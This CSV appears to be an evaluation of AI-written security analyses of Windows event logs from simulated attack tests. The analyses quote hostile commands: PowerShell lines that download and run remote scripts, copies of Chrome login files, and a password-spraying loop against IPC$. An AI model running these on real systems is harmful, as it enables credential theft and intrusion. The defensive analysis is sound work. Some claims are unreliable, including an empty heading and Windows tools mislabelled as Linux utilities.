Directory Name,AI Response
Password Brute User using Kerbrute Tool,"Upon reviewing the event logs provided, there are several noteworthy observations:

### Windows PowerShell Log Analysis:
1. **Suspicious Command Execution:**
   - A PowerShell command is executed with potentially evasive directory traversal (`..\\Externalfiles`) and involves an executable (`script.exe`). The command uses parameters like `bruteuser`, which typically denotes brute force attack activity.
   - Example command: `powershell.exe & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles"" .\\script.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1}`.

### Security Log Analysis:
1. **Event ID 4624 and 4672:**
   - Multiple successful logon events with elevated privileges (SeDebugPrivilege, etc.), typically assigned to SYSTEM accounts, are noted.
   - While SYSTEM activity in `ADVAPI` is expected, it might warrant close scrutiny if associated with suspicious processes.
   
2. **Event ID 4798:**
   - Activities involve querying group information for several accounts, including `Administrator` and `admin_test`. Though such activity can be typical, it can also be reconnaissance before an attack.

3. **Credential Retrieval Attempt (Event ID 5379):**
   - Multiple failed attempts to retrieve credentials (indicated by `ReturnCode=""3221226021""`), involving Microsoft accounts (`02txoixylodcstop`). This suggests possible unauthorized access attempts or misconfigurations.

### Sysmon Log Analysis:
1. **Suspicious PowerShell Activity:**
   - Sysmon captures similar PowerShell execution as observed in PowerShell logs with high integrity, which implies potential privilege abuse for malicious tasks.
   - The command line and parent process (`wsmprovhost.exe`) suggest possible remote management, which can be misused for lateral movement.

2. **Frequent Use of `conhost.exe` and `wevtutil.exe` by `admin_test`:**
   - Appears repeatedly in quick succession, often associated with process creation or manipulation activities.

3. **Executable Paths and User Context:**
   - Presence of potentially unsafe paths and non-standard use of executables in the system directory, frequently running under `SERVER002\\admin_test` context.

### Application Log:
- Regular entries that indicate Windows Defender is operational, which is generally expected in a secured environment.

### Assessment:
The logs indicate suspicious behavior, especially with the PowerShell commands hinting at brute force or broad reconnaissance. The pattern of SYSTEM-level access with credential handling, group enumeration, along with an executable potentially associated with sensitive commands, suggests malicious intent rather than pure anomaly.

### Conclusion:
**Resolution: MALICIOUS.** The evidence within these logs—corroborated by potentially harmful PowerShell activity and various failed credential events—strongly suggests a compromise or an active threat.

### Guidance for Next Steps:
1. **Immediate Incident Response:**
   - Isolate `Server002` and conduct a full forensic analysis.
   - Investigate processes and executables referenced in the logs, especially for `script.exe` and directory accesses.
   
2. **Review User Activity:**
   - In-depth review of user `admin_test` activities, including access logs and associated network traffic.
   
3. **Coordinate with System Administration:**
   - Patch any existing vulnerabilities and ensure all defense mechanisms (AV, EDR) are intact and updated.

4. **Long-term Security Measures:**
   - Strengthen logging and monitoring to detect suspicious patterns early.
   - Enhance policy controls around PowerShell execution and directory access."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus (2),"Upon reviewing the provided logs, I have noted several key points indicating potentially malicious activity:

### Observations:
1. **Execution of PowerShell Scripts from an Unauthorized Source:**
   - The PowerShell log shows an ""iex (new-object net.webclient).downloadstring"" command attempting to download and execute a script from a GitHub repository (""https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1""). This is typically indicative of an attempt to execute remote code, which is considered suspicious and potentially harmful.

2. **Unusual Execution of ""whoami.exe"" and ""hostname.exe"":**
   - These commands are commonly used for reconnaissance to gain information on the currently logged-in user and hostname. In the context of this log, they are executed under a high integrity level, which could indicate a privilege escalation attempt or an exploitation posture.

3. **Frequent Execution of ""MicrosoftEdgeUpdate.exe"" with Different Parameters:**
   - While Microsoft Edge Update processes can legitimately appear frequently, the extensive execution under “NT AUTHORITY\SYSTEM” without corresponding browser activity and with parameters such as ""/update"", ""/regsvc"", and ""/installsource core"" might suggest that these processes are being exploited or leveraged as part of a persistence mechanism or lateral movement.

### Assessing Potential Threats:
- **Remote Code Execution:** The PowerShell command indicates an attempt to download and execute scripts, potentially introducing malware or establishing unauthorized connections to control the system.
- **Reconnaissance:** Execution of ""whoami.exe"" and ""hostname.exe"" indicates attempts to gather system and user information to aid in further attacks or compromise.
- **Persistence and Privilege Misuse:** Unusual activity surrounding Microsoft Edge Update processes suggests potentially malicious persistence tactics or exploitation of legitimate updater services by attackers to maintain elevated privileges.

### Resolution:
Based on these observations, this activity is flagged as `MALICIOUS`. The downloading and execution of remote scripts through PowerShell, coupled with the unusual command executions and the utilization of system processes for potential persistence, indicate a high likelihood of system compromise.

### Recommended Actions:
1. **Immediate Isolation:** Isolate the host from the network to prevent further spread or damage.
2. **Forensic Analysis:** Conduct deeper forensic analysis of the PowerShell invocation and network connections to ascertain the extent of compromise.
3. **Review Access Logs:** Examine user access patterns and logs for any unauthorized access or privilege escalation.
4. **Update Antivirus/Endpoint Security:** Ensure all security tools are updated and conduct thorough scans.
5. **Patch Management:** Verify that the system is fully patched against known vulnerabilities, especially in PowerShell and related applications.
6. **User Training:** Reinforce user training against phishing attacks, which often precede such intrusions.

This assessment indicates active threats, and immediate remediation efforts are necessary to secure the environment."
Extract all accounts in use as SPN using setspn,"Upon reviewing the provided log entries from the Windows event logs, the following analysis summarizes observations, assessments, and a resolution:

### Analysis of Logs

#### Sysmon Log
1. **PowerShell Execution:**
   - A process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) is seen running. PowerShell is a legitimate tool but often leveraged by attackers post-exploitation for various malicious activities.
   
2. **Command Execution:**
   - Processes like `wevtutil.exe`, `cmd.exe`, and `setspn.exe` are executed. These are standard Windows utilities but can be used for malicious activities such as event log clearing or network enumeration.
   - The command logged with `cmd.exe` is `""/c setspn -T %%USERDNSDOMAIN%% -Q */*""`. It's querying SPNs, an action commonly associated with Kerberos ticket enumeration, which could indicate reconnaissance activity, possibly related to privilege escalation or lateral movement attempts.

3. **Frequent Launch of Conhost and Wevtutil:**
   - The frequent executions of `conhost.exe` and `wevtutil.exe` seem unusual and could indicate automated tasks or scripts being run. While `conhost.exe` is standard for console applications, the presence of these without context may warrant further investigation.

4. **Edge Update Activities:**
   - Numerous `MicrosoftEdgeUpdate.exe` processes are observed. These denote updates to Microsoft Edge, which generally is a benign activity unless leveraged by a malicious actor using a legitimate process for persistence or hiding actions.

#### Security Log
- **Time Synchronization:**
  - The logs indicate time synchronization processes, which are normal for system maintenance. No suspicious user activity is noted here.

#### Application Log
- **Edge Update Logging:**
  - Entries indicate service stops related to Edge updates. This corresponds with the Sysmon logs showing activity of `MicrosoftEdgeUpdate.exe`, supporting that these could be routine system updates.

#### System Log
- **Time Adjustments:**
  - Indicates a time synchronization activity with no additional evidence suggesting malicious intent.

### Assessment
- The logs present a mix of potentially benign system maintenance and some activities that warrant closer attention, particularly around PowerShell and SPN queries. The frequent and rapid executions of console host processes (`conhost.exe` and `wevtutil.exe`) might suggest a scripted or automated task. However, without evidence of malicious payload execution or unauthorized data access, these findings alone do not confirm malfeasance.

- The observed SPN querying and PowerShell execution without accompanying malicious indicators mean we cannot definitively conclude the activities are malicious without further context or corroborative evidence.

### Guidance & Resolution
Given the analysis, the situation should be classified as:

**SUSPICIOUS**

**Recommendations for Further Action:**
1. **Investigate SPN Queries:** Review which accounts and systems were being queried. This could uncover potential lateral movement or privilege escalation attempts.
2. **PowerShell Script Review:** If any PowerShell scripts are running, verify their contents to ensure they are legitimate and not the result of a compromise.
3. **Network Traffic Monitoring:** Analyze traffic patterns and access records for the server to detect any unusual outbound connections or data exfiltration attempts.
4. **Broader Context Analysis:** Review additional logs or system behaviors in a broader window for correlating activities, focusing on any anomalies that might indicate a breach.

These steps are crucial in determining the intent behind the actions observed in the logs and protecting against potential threats."
WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"Upon reviewing the provided logs, a sequence of events can be observed that indicates potentially malicious activity:

1. **Time Manipulation**: The Sysmon and Security logs show a change in the system time. EventID 4616 in the Security log and EventID 1 in the System log denote that the system's clock was manually adjusted. Time manipulation is often an attempt to cover tracks by modifying timestamps of log entries or files.

2. **Suspicious PowerShell Activity**: There is a PowerShell execution with a suspicious command line (`powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')}`). This command indicates the use of PowerShell to download and execute a script from an external source, which is a common tactic for downloading and executing malware or running unauthorized scripts.

3. **Process Execution Anomalies**: The frequent execution of system executables such as `hostname.exe`, `whoami.exe`, and `wevtutil.exe` under the same user account in quick succession alongside PowerShell script execution is another indication of odd behavior. These utilities are often used during reconnaissance phases of attacks and to perform tasks like event log manipulation (as in the case of wevtutil).

4. **Use of High Privileges**: The user `ADMIN_TEST` appears to have a session with elevated privileges (as shown in EventID 4672 in the Security log), and this account is executing sensitive actions like downloading external scripts and accessing system utilities. This could reflect an insider threat or that an external actor has compromised the account.

Considering these factors, the logs indicate behavior consistent with:
- Attempts to cover tracks via time changes.
- Unauthorized script execution via PowerShell with potential downloading of malicious content.
- Anomalous use of common system utilities possibly indicating reconnaissance or preparation for further attacks.

**Resolution**: **MALICIOUS**

**Recommendations**:
1. **Immediate Action**: Isolate the affected machine (Server002) from the network to prevent further command and control communications or data exfiltration.
2. **Investigation**: Conduct a detailed forensic analysis on Server002 to assess the impact and to determine the extent of the compromise.
3. **User Credential Revocation**: Reset all credentials associated with the `admin_test` account as these could be compromised.
4. **Audit and Monitoring**: Increase monitoring of similar suspicious activities across other systems in the network, focusing on PowerShell usage and file download patterns.
5. **System Patching and Hardening**: Verify that all systems are fully patched, and appropriate security controls such as execution of PowerShell scripts are restricted and logged.
6. **Incident Response**: Inform your incident response team and, if applicable, external stakeholders to coordinate a response that aligns with company policies and legal requirements."
WinPwn - Snaffler,"Based on the Windows event logs provided, here's a summary of my analysis:

### Suspicious Activities:
1. **PowerShell Activity (Sysmon EventID 1, EventID 600 & 403 in PowerShell Logs)**:
   - There is a PowerShell process execution with the command involving downloading and executing a script from a remote location (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). 
   - This behavior is typically associated with malicious activities as it involves downloading code over the internet and executing it, which is a common method for attackers to deliver and execute malware.

2. **Time Manipulation (System and Security Logs, EventID 1 and 4616)**:
   - There are events indicating the system time being set back (EventID 1 in System logs and EventID 4616 in Security logs). 
   - This is often suspicious as changing system time can be a technique used to bypass certain logging or security checks.

3. **Privileged Account Actions (EventID 4672 in Security Logs)**:
   - The logs record the usage of a highly privileged account (`SERVER002\\admin_test`), with a comprehensive list of privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.
   - Such privileges can be leveraged for privilege escalation or to mask malicious activity.

4. **Frequent Execution of Command-line Windows Utilities**:
   - Regular execution of utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe` is noticed, potentially indicating reconnaissance activities.

5. **Edge Update Activity**:
   - Elevated number of entries related to Microsoft Edge Update and its components, which might suggest legitimate software update activity. However, the excessive number of update-related processes in a short time frame may indicate some abnormal behavior that warrants further checking particularly if updates are not scheduled.

### Assessment:
The logs include a pattern of suspicious behavior that matches common tactics, techniques, and procedures (TTPs) used by attackers. The use of PowerShell to download and execute remote scripts is particularly concerning, and the potential manipulation of system time suggests attempts to obscure malicious activity. The combination of these activities, along with the privileged account use, points toward a potential compromise.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Action**: 
   - Isolate the machine (Server002) to prevent lateral movement or further damage within the network.
   - Review network traffic and endpoint logs to identify any other potentially affected systems.

2. **Forensic Investigation**: 
   - Conduct a detailed forensic analysis on the compromised host to understand the scope of the intrusion.
   - Retrieve and inspect the script downloaded from GitHub (as referred in the PowerShell logs).

3. **Remediation**:
   - Change all passwords related to privileged accounts, especially `admin_test`.
   - Review and potentially restrict scripts and command execution policies, particularly for PowerShell.

4. **Monitoring and Detection**:
   - Implement stricter monitoring of privileged account activity and internet-bound PowerShell executions.
   - Use behavioral analytics to detect anomalous patterns related to system time changes or unusual process creations.

This overall analysis indicates that there are definite signs of malicious activity, requiring immediate containment and investigation."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"### Detailed Analysis

Upon reviewing the provided Windows event logs, focusing on PowerShell and Sysmon logs, we can deduce the following:

#### Observations

1. **PowerShell Activity**
   - PowerShell events indicate the execution of a command using `appcmd.exe` to list application pools with the command: `powershell.exe & {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}`. This command is typically used for managing Internet Information Services (IIS) web servers, often by administrators.
   - The command was run under the context of `ConsoleHost` which is a typical interface for command-line executions.

2. **Sysmon Activity**
   - Multiple processes related to Microsoft Edge's update process (e.g., `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and `setup.exe`) are indicative of a software update or installation.
   - Commands such as `whoami.exe` and `hostname.exe` are executed, which are standard administrative commands for checking current user and hostname respectively.
   - The use of `wevtutil.exe`, `conhost.exe`, and PowerShell suggests administrative or maintenance actions. However, `wevtutil.exe` is often used to export event logs, start and stop event log channels, etc., and may require further review to determine its intent.

3. **User Context and Privileges**
   - Activities such as PowerShell and Edge update processes ran under `NT AUTHORITY\SYSTEM`, which is a typical system-level authority for legitimate system processes.
   - Other activities, including `wevtutil.exe` and admin commands, were executed by an account `SERVER002\admin_test`. This indicates that they were initiated by someone with administrative access.

#### Suspicious Factors

- **PowerShell Command Line**: Execution of system utilities like `appcmd.exe` through PowerShell can be suspicious if it is unexpected activity. However, given it relates to IIS server management, this might be regular administrative activity.
- **Multiple Uses of `wevtutil.exe`**: While not inherently malicious, this utility being invoked multiple times may suggest attempts to clear or export event logs, potentially covering tracks.
- **High Integrity Level Execution**: Commands run with a high integrity level, such as by an admin, need monitoring but are not immediately indicative of malicious activity unless unexpected or unauthorized.

#### Conclusion

The logs reflect primarily administrative actions on the Windows host. Operations include software updates, which align with scheduled activities for major applications like Microsoft Edge. Despite some potentially suspicious activities, such as the repeated use of `wevtutil.exe`, no clear signs of compromise or definite malicious intent are observable from the logs.

### Final Resolution

**SUSPICIOUS**

Further investigation and contextual understanding are warranted. Confirmation with the responsible admin about the scheduled operations and previous permissions granted for these activities should be done to ensure it aligns with expected administrative tasks. Focus particularly on understanding the `wevtutil.exe` invocations to ensure they were purposefully conducted as part of maintenance operations."
Simulating access to Chrome Login Data,"Based on the analysis of the provided Windows event logs, the following key observations and analysis have been made:

### Suspicious Activity

1. **Windows PowerShell Log Analysis**:
   - Multiple PowerShell events are logged indicating the use of PowerShell scripts to copy sensitive data from Google Chrome's local data directories. The relevant commands are:
     ```
     Copy-Item ""$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles""
     Copy-Item ""$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles""
     ```
   - These commands suggest an attempt to copy Chrome login data files to another directory on the system, which could be indicative of credential theft or some other form of data exfiltration.

2. **Sysmon Log Analysis**:
   - The execution of `powershell.exe` is confirmed in the Sysmon logs with a process creation logged for PowerShell. The command line reveals the intent of the scripts, matching the suspicious activity found in the PowerShell logs.
   - The events include other system-related binaries that executed around the same time, such as `conhost.exe`, which may be part of normal operations but do form a pattern consistent with command and control or lateral movement steps often following a data collection action.
   
3. **Security Log Analysis**:
   - The Security logs include typical events like service logons and privileged actions by the 'SYSTEM' account.
   - Privileged actions (`EventID 4672`) were observed with the following privileges listed: SeDebugPrivilege, SeTcbPrivilege, and others, indicating potential use of elevated privileges.

### Assessment

- **Suspected Credential Theft**: The copying of Chrome user data with PowerShell scripts is highly suspicious. These actions could be indicative of malicious activity aiming to gather user credentials stored in the browser.
- **Privileged Activity**: Several Windows services run as 'SYSTEM', which is common, but the specific combination of services and the PowerShell script activity is anomalous and linked with potential unauthorized data access or exfiltration attempts.

### Resolution

Given the detailed analysis, the conclusion for the resolution is:

- **MALICIOUS**: The pattern of copying Chrome login data using PowerShell scripts suggests a clear intent of data theft, lining up with common indicators of compromise related to credential harvesting.

### Recommendations

- **Immediate Action**: Isolate the affected host to prevent potential lateral movement or further data exfiltration.
- **Credential Reset**: Advise users whose credentials may have been compromised to change their passwords immediately.
- **Log Monitoring**: Enhance monitoring and alerting for PowerShell activities and access to browser data on all systems.
- **Incident Response**: Conduct a detailed forensic investigation to ascertain the extent of the compromise and identify other potentially affected hosts.
- **Review Security Policies**: Ensure strict application control and network segmentation policies to mitigate similar threats in the future.

These steps should help in containing the situation and enhancing security posture against future attempts."
Create Volume Shadow Copy with vssadmin,"Upon reviewing the provided logs, here's a detailed analysis:

**Security Log Analysis:**
- The logs display multiple Event ID 5379 records associated with SYSTEM credentials attempts on various services (`MicrosoftAccount:user`, `WindowsLive:token`, etc.). The ReturnCode `3221226021` indicates a ""STATUS_NO_SUCH_USER"" error, implying failed authentication attempts possibly using SYSTEM account credentials. This is unusual and could indicate an automated or scripted process attempting to access these services.

**Application Log Analysis:**
- The application log indicates that Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`). This is standard behavior and does not indicate any threat.

**System Log Analysis:**
- The system log entries show that the system is performing a routine Windows security update (Update KB2267602 for Defender Antivirus). It's common and expected behavior, not indicative of malicious activity.

**Sysmon Log Analysis:**
- Sysmon logs show a series of command-line executions from `cmd.exe`. The notable execution pattern includes the registry query: `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions /v ProductType | findstr LanmanNT`. This is generally a method to check the system's Windows variant, possibly for compatibility or version checks. While not inherently malicious, it is worth noting in the context of scripts with privilege requirements.
- Another critical observation is the use of `vssadmin.exe` to create a shadow copy (`vssadmin.exe create shadow /for=C:`). While this could be legitimate, it is a known technique used by ransomware to immobilize endpoint recovery processes. On its own, this action is highly suspicious.
- Other logged processes like `whoami.exe`, `hostname.exe`, etc., are generally benign, serving to gather system information.

**Suspicious Patterns & Indicators:**
- Automated SYSTEM credentials access attempts combined with commands potentially used for malicious reconnaissance (`vssadmin.exe`, `reg query`) suggest unusual behavior.
- The use of `vssadmin.exe` warrants further attention due to its association with malicious processes, particularly in the context of ransomware activities.

**Conclusion & Recommendations:**
- Resolution: **SUSPICIOUS**
- The actions documented in the logs do not definitively indicate malicious activity but do include elements that are typical of suspicious activity (credential access attempts, system probing, `vssadmin` usage).
- Recommended follow-up actions:
  - Conduct an in-depth investigation of the `vssadmin.exe` usage: Determine if this action was initiated by IT administrative tasks or unauthorized scripts.
  - Correlate this data with potential network or file activity to identify any indicators of ransomware or lateral movement.
  - Verify SYSTEM access attempts: ensure these are consistent with expected behaviors and align with legitimate processes or known scripts.
  - Monitor the server for any further suspicious activity, focusing on snapshots, backups, and privilege escalation attempts.

This cautionary stance ensures any potential threats or benign anomalies are scrutinized comprehensively."

Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon analyzing the provided log entries, several points of interest emerge that warrant further investigation:

1. **Event ID 4624 and 4672 in the Security Log**:
   - Both these logs are for a Logon Event and Special Privileges assigned to the SYSTEM account on `Server002`. These logs themselves are common on Windows systems, representing typical system activity where the SYSTEM account logs on to perform tasks.

2. **Sysmon Log Analysis**:
   - Numerous instances of process creation are recorded. Notably, processes like `powershell.exe`, `cmd.exe`, `wevtutil.exe`, and `conhost.exe` are executed.
   - The invocation of `whoami.exe` and `hostname.exe` could indicate information gathering behavior, which is often a precursor to lateral movement by an attacker.
   - The command `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Outflank-scriptt.exe""` is particularly worrying. The usage of a script or executable with the name pattern ""Outflank-scriptt.exe"" loaded from a temporary directory is a strong indicator of malicious activity. The ""Outflank"" prefix resembles names commonly used for offensive security tools.
   - The use of `wevtutil.exe` with command line arguments `epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx` suggests potential cleansing or exporting of logs, which is a tactic to cover tracks.

3. **Privilege and User Context**:
   - Many activities are executed by `SERVER002\admin_test`, which might be an admin user. Execution in high-integrity levels by this user account indicates potential compromise or misuse of admin privileges.

**Assessment**:
The logs display behavior indicative of a compromise, likely characterized by reconnaissance and potential execution of a malicious script or tool. The unfamiliar executable name, coupled with log manipulation tactics, raises serious concerns about malicious activity.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate actions should include isolating the system to prevent further potential lateral movement.
- Conduct a forensic analysis on the machine, particularly focusing on files within the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory.

- Review and reinforce security controls, such as endpoint monitoring, and ensure logging integrity and retention policies are robust.
- Notify concerned teams or stakeholders about potential compromise and proceed with incident response protocols."
Gsecdump,"Upon reviewing the provided Windows event logs, several entries and patterns stand out that warrant a closer inspection for potentially suspicious activities:

1. **High Frequency of System Utilities**: 
   - The logs show frequent execution of `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `conhost.exe` within a short time frame. While execution of these processes individually can be normal, their rapid and repeated invocation might indicate automated tasks, scripts, or malicious activity.
   - Powershell is often used by attackers for post-exploitation due to its powerful capabilities, while `wevtutil.exe` can be used to query or clear event logs, which might be used by an attacker to cover tracks.

2. **Suspicious Command Execution**:
   - The command line for `cmd.exe` executes a potentially suspicious script from the temp directory: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.exe"" -a`.
   - The use of directories like the Temp folder and obscured paths are often linked with malware activities. Additionally, the execution of scripts from such locations, especially if unexpected, could be an indication of malicious attempts.

3. **Unusual Activity of `wsmprovhost.exe`**:
   - It is observed as the parent process for commands like `hostname.exe` and `whoami.exe`. This could indicate that these processes were triggered through Windows remote management or similar, which might be benign or might indicate remote access used in an unauthorized way.

4. **Credential Access (Event ID 5379)**:
   - The security logs indicate multiple `5379` events, which deal with credential validation errors. Such entries, paired with a return code indicating failure (`3221226021`), might suggest brute-force attempts or an application failing to authenticate against a resource.

5. **No Clear Trace of File Modification, Network Connections, or Log Deletions**:
   - While the logs provided do not explicitly demonstrate file modifications, network connections (which would typically be monitored through Sysmon Event IDs like `3` or `11`), or log deletions involving `wevtutil.exe`, these activities could have occurred beyond the scope of the provided logs.

### Conclusion
- **Assessment**: Given the presence of potentially suspicious scripts, high frequency and clustered execution of administrative and potentially sensitive system utilities, it is prudent to classify this log analysis as **SUSPICIOUS**. There's strong evidence suggesting either an attempted reconnaissance or configuration change without conclusive proof of malicious compromise.
- **Recommendations**:
  1. Conduct a deeper investigation to gather more context, particularly around the origin and schedule that triggered the script execution. Check system policies, scheduled tasks, or registry edits.
  2. Review user accounts and permissions to ensure no unauthorized access capabilities.
  3. Analyze the `script.exe` for any signs of malicious behavior. Use tools such as sandboxes or antivirus/endpoint detection and response (EDR) tools.
  4. Monitor the system for any further indicators of compromise and adjust logging to capture more granular data if necessary (e.g., PowerShell command logs, detailed network connection logs).
  5. Consider strengthening or enforcing security policies related to script execution and privilege usage to mitigate potential security risks."
Brute Force Credentials of single Active Directory domain users via SMB,"Upon examining the provided event logs, there are several activities that warrant attention:

### Suspicious or Anomalous Behavior:

1. **Time Changes in System Logs:**

2. **Security Log Events with Elevated Privileges:**
   - The security logs reflect multiple events where the user ""admin_test"" was granted a series of elevated privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). While it's not uncommon for administrative users to have elevated rights, frequent granting or logging of these events could indicate suspicious activities like attempts to use these privileges for unauthorized actions.

3. **Sysmon Logs - Unusual Command Line Activity:**
   - A concerning `cmd.exe` command line is detected, which creates a file with multiple passwords and attempts to use these to connect to a server's IPC$ share. This is highly indicative of a password-spraying or brute-force type attack across network shares:
     ```
     ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & ... & @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p""
     ```

4. **Repeated Use of System Utilities:**
   - There are multiple executions of Linux kernel general utilities and Net commands (`wevtutil.exe` and `conhost.exe`), possibly indicative of an automated or scripted process. While not inherently malicious, such behavior can be indicative of adversarial lateral movement or privilege escalation efforts.

5. **Edge Update Activity:**
   - The application and sysmon logs show a series of entries for Microsoft Edge Update operations. Although legitimate, if an attacker gains control of such processes, they could be used to introduce malicious updates or bypass security.

### Malicious Indicators:

- **Password Spray/Brute Force Indication:**
  The presence of commands attempting multiple password authentications for IPC$ shares is a strong indicator of malicious attempts to access network resources using guessed credentials. This aligns with typical lateral movement tactics in network compromises.

### Assessment:

- Based on the evidence of a suspicious command-line process involving `cmd.exe` and the creation of a password file with subsequent attempt at connecting to IPC$ shares, it is reasonable to suspect a malicious attempt at unauthorized access. However, while indicative, further verification and broader network logs or alerts would typically be required to confirm malicious intent unequivocally.

### Final Resolution:

- **MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected machine (Server002) to prevent potential lateral spread of any malicious activity.
   - Alert the IT and Security Operations team about this incident.

2. **Further Investigation:**
   - Conduct a forensic audit on the affected system to determine the extent of any breach and identify any additional malware or backdoors.
   - Analyze network logs to trace potential sources of unauthorized accesses or additional infected nodes.

3. **Security Measures:**
   - Review and harden security policies, especially those related to user privileges and password policies.
   - Consider implementing monitoring and alerting for suspicious command-line executions and privilege escalation attempts in the future. 

4. **Post-Incident:**
   - Review incident response protocols to ensure better preparedness for detecting similar anomalies moving forward.
   - Provide staff training focused on recognizing and reporting suspicious activities."
WinPwn - DomainPasswordSpray Attacks,"### Detailed Analysis

Upon reviewing the provided Windows event logs from various sources, several aspects stand out as needing closer examination due to potential indicators of malicious activity:

1. **Windows Time Change Events (Security and System logs)**:
   - Events ID 4616 in the Security log indicate a change of system time. The process executing this change is `svchost.exe` under the LOCAL SERVICE account. While time changes can be benign, they can also be used to manipulate time-based security controls or logs.

2. **Security Software Status (Application log)**:
   - Multiple entries show Windows Defender being in the ""ON"" state, which is standard and does not indicate any issue.

3. **Sysmon Logs - Frequent Use of PowerShell and Network Connectivity (`wevtutil.exe`, `conhost.exe`, `powershell.exe`)**:
   - The repeated execution of `wevtutil.exe`, often used to query or modify event logs, suggests potential tampering with log files.
   - The execution of `powershell.exe` with command lines accessing a remote script repository and executing scripts directly from the internet is highly suspicious. The script appears to attempt a potential domain password spraying attack, which is a clear malicious activity.
   - The use of tools and command lines to interact with system components where the `conhost.exe` was often found as a child process of `wevtutil.exe` and other suspicious applications. This pattern aligns with probable malicious script execution or evasion tactics.

4. **PowerShell Logs - Execution of Suspicious Scripts**:
   - The PowerShell logs show the execution of scripts sourced from a GitHub repository. This execution without an apparent legitimate need indicates unauthorized activity. The script specifically attempts a domain password spray, implying an attempt to compromise user accounts on the network.

5. **Process Execution Chain**:
   - The use of `wsmprovhost.exe` as the parent process is notable as it is involved in PowerShell remoting and Windows Management Instrumentation (WMI), which are common targets for lateral movement and remote execution by attackers.

### Conclusion and Resolution

**Based on the evidence found in the examination of these logs, particularly the suspicious PowerShell execution of a remote script, changes in system time, and the use of potentially evasive tools like `wevtutil.exe`, the activity can be classified as:**

- **MALICIOUS**

### Threats or Risks Identified
- Likely compromise due to executed command lines indicating attempts to perform network-related attacks (e.g., domain password spray).
- Possible tampering with logs or system time for purposes of obfuscation or evasion.

### Guidance on How to Proceed
1. **Immediate Isolation**: Disconnect the affected host from the network to prevent further malicious activity or spread.
2. **Forensic Analysis**: Perform a detailed forensic analysis of the host to confirm the scope of the compromise and identify affected files or systems.
3. **Review Network Activity**: Investigate network logs for outbound traffic to the specified suspicious external URL and check for any unauthorized configurations or access.
4. **Account Security**: Review access logs and credentials, especially those potentially affected by the password spraying activity. Consider enforcing a password reset for compromised accounts.
5. **Update and Patch**: Ensure all systems are fully patched and up to date, specifically on known vulnerabilities that could be exploited by such attacks.
6. **Strengthen Monitoring**: Implement enhanced monitoring for future anomalies related to PowerShell usage, svchost.exe processes, and network activity.

This assessed malicious activity suggests a potentially broader threat that requires proactive response measures."
WinPwn - Kerberoasting,"Upon reviewing the provided Windows event logs, the following observations and analysis are presented:

### Suspicious/Anomalous Behavior:

1. **PowerShell Execution**:
   - Multiple instances of PowerShell (Event ID 1) are recorded running with the command `powershell.exe & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), scripting -consoleoutput -noninteractive}`.
   - This command indicates the download and execution of a script from a remote repository, which is often a technique used in malicious activities such as downloading malware or executing scripts without the user's consent.

2. **Use of Wevtutil and Conhost**:
   - Several instances of `wevtutil.exe` and `conhost.exe` (Sysmon Event ID 5) executed under the `SERVER002\admin_test` account. While these utilities are part of standard Windows operations for log management and console handling, their frequent invocation, especially in a scripted or batch execution format, can sometimes hint at scripted reconnaissance or log tampering efforts.

### Indicators of Malicious Activity or Compromise:

- **Downloading and Executing Scripts**:
  - The PowerShell command as seen in logs is suspicious due to its purpose of downloading and executing a script directly from the internet, which is indicative of potentially malicious intent.

- **High Integrity Level Indicator**:
  - The processes executing PowerShell do so with a high integrity level, potentially indicating elevated privileges, which could imply privilege escalation or unauthorized administrative actions.

- **Network Activity from Scripts**:
  - The presence of internet-based activities related to downloading scripts suggests possible external communications that are often associated with command and control mechanisms used in cyber intrusions.

### Conclusion:

Given these observations, the activity seen in the logs is classified as **SUSPICIOUS**. The execution of PowerShell to download and run scripts from external sources represents a potential security risk that needs further investigation to ensure no malicious scripts have been executed that could compromise the security of the host machine or network.

### Recommendations:

1. **Immediate Investigation**: Launch a thorough investigation into the use of PowerShell scripts downloaded from external sources. Investigate network logs and firewall settings to identify any unauthorized outbound traffic or data exfiltration.
   
2. **User Account Review**: Scrutinize actions taken by the `SERVER002\admin_test` account to verify intended user activities and ensure that the credentials have not been compromised.
   
